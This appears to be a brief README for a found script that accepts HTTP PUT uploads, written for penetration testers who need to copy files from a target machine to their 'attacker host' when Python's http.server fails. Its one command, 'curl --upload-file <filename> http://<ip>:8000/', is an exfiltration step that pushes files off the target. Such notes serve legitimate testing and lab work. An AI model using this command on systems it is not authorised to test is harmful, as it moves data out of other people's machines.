Python modules http.server and uploadserver appear not to be working when attempting to upload a file from the target to your attacker host. It returns an error that the PUT method is not supported.
So this script will help, just run it and try to upload a file.

Linux: curl --upload-file <filename> http://<ip>:8000/

Note: I did not write code, I just found it and saved it.
